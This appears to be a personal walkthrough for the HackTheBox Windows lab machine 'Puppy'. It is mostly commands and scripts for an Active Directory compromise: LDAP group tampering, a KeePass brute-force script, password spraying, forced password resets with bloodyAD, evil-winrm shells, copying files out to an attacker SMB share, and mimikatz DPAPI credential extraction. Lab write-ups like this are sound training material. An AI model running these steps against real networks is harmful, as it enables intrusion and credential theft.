# Puppy

## 📌 Box Info

- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)

creds

levi.james / KingofAkron2025!

53/tcp   open  domain        Simple DNS Plus
[88](Kerberos)/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 08:38:48Z)
[111]/tcp  open  [rpcbind](RPC)     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3         2049/udp   nfs
|   100005  1,2,3       2049/udp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100024  1           2049/tcp   status
|_100024  1           2049/udp   status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


smbmap -H 10.10.11.70 -u levi.james -p KingofAkron2025!

IPC$
NETLOGON
SYSVOL


add.ldif
```
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=LEVI B. JAMES,OU=MANPOWER,DC=PUPPY,DC=HTB
```

```
ldapmodify -x -H ldap://10.10.11.70 -D "CN=LEVI B. JAMES,OU=MANPOWER,DC=puppy,DC=htb" -w 'KingofAkron2025!' -f add.ldif
```

```
net rpc group members "DEVELOPERS" -U "levi.james" -S 10.10.11.70
```

we check our perms again

```
smbmap -H 10.10.11.70 -u levi.james -p KingofAkron2025!
```

we view dev

```
smbclient //10.10.11.70/DEV -U levi.james
```

brute-kdbx.sh
```bash
#!/bin/bash

DB="recovery.kdbx"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting brute-force on $DB using $WORDLIST"

while IFS= read -r password; do
    echo "[*] Trying: $password"

    echo "$password" | keepassxc-cli db-info "$DB" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS! Password found: $password"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] Brute-force finished. No valid password found."
```

keepassxc recovery.kdbx

enter liverpool

create our user file and password file

user
```
ant.edwards
adam.silver
jamie.williamson
samuel.blake
steve.tucker
```

password
```
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
HJKL2025!
```

revisit bloodhound

```
MATCH p=shortestPath((n {owned:true})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GPLink|AddAllowedToAct|AllowedToAct|WriteAccountRestrictions|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote|SyncLAPSPassword|DumpSMSAPassword|AZMGGrantRole|AZMGAddSecret|AZMGAddOwner|AZMGAddMember|AZMGGrantAppRoles|AZNodeResourceGroup|AZWebsiteContributor|AZLogicAppContributo|AZAutomationContributor|AZAKSContributor|AZAddMembers|AZAddOwner|AZAddSecret|AZAvereContributor|AZContains|AZContributor|AZExecuteCommand|AZGetCertificates|AZGetKeys|AZGetSecrets|AZGlobalAdmin|AZHasRole|AZManagedIdentity|AZMemberOf|AZOwns|AZPrivilegedAuthAdmin|AZPrivilegedRoleAdmin|AZResetPassword|AZUserAccessAdministrator|AZAppAdmin|AZCloudAppAdmin|AZRunsAs|AZKeyVaultContributor|AZVMAdminLogin|AZVMContributor|AZLogicAppContributor|AddSelf|WriteSPN|AddKeyCredentialLink|DCSync*1..]->(m:Group {name:"DOMAIN ADMINS@PUPPY.HTB"})) WHERE NOT n=m RETURN p
```

look to see chain from ant.edwards to domain admin

![[Pasted image 20250522011631.png]]


install bloodyad

```
sudo apt install bloodAD
```

```bash
/usr/bin/bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
```

check if adam silver is enabled

```bash
netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'HJKL2025!'
```

change password

```bash
bloodyAD --host '10.10.11.70' -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password adam.silver Pototo_123
```

```bash
netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'Pototo_123'
```

```bash
evil-winrm -i 10.10.11.70 -d puppy.htb -u adam.silver -p 'Pototo_123'
```

```powershell
whoami /priv
```

since the account gets disabled every 5 minutes

adam_unlocker.sh

```bash
#!/bin/bash

# Step 1: Enable adam.silver
echo "[*] Enabling adam.silver account..."
/usr/bin/bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE

# Step 2: Check if adam.silver is enabled with original password
echo "[*] Testing login with old password (HJKL2025!)..."
netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'HJKL2025!'

# Step 3: Change password to Pototo_123
echo "[*] Changing password for adam.silver to 'Pototo_123'..."
/usr/bin/bloodyAD --host 10.10.11.70 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password adam.silver Pototo_123

# Step 4: Verify new credentials work
echo "[*] Verifying new password works for adam.silver..."
netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'Pototo_123'

# Step 5: Spawn Evil-WinRM shell
echo "[*] Launching Evil-WinRM as adam.silver..."
evil-winrm -i 10.10.11.70 -u adam.silver -p 'Pototo_123'
```


Local
```bash
impacket-smbserver loot $(pwd) -smb2support
```

DC
```
copy site-backup-2024-12-30.zip \\10.10.14.3\loot
```

```
unzip site-backup-2024-12-30.zip
```


```
grep -r -i -E 'password|passwd|pwd|secret|token|api|key' .
```

found creds in backup

```bash
evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'
```

```
upload /opt/BloodHound-Legacy-master/Collectors/SharpHound.exe
```

.\sharpHound.exe -c All

show all users in domain
```
net user
```

Look for access of DPAPI
```
dir "$env:APPDATA\Microsoft\Credentials"
dir "$env:LOCALAPPDATA\Microsoft\Credentials"
dir "$env:APPDATA\Microsoft\Protect"
```

https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html

#DPAPI [DPAPI](DPAPI.md)

```
upload mimikatz.exe
```

```
.\mimikatz.exe "dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" "exit"
```

read dpapi in windows
```
.\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" "exit"
```

.\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" "exit"
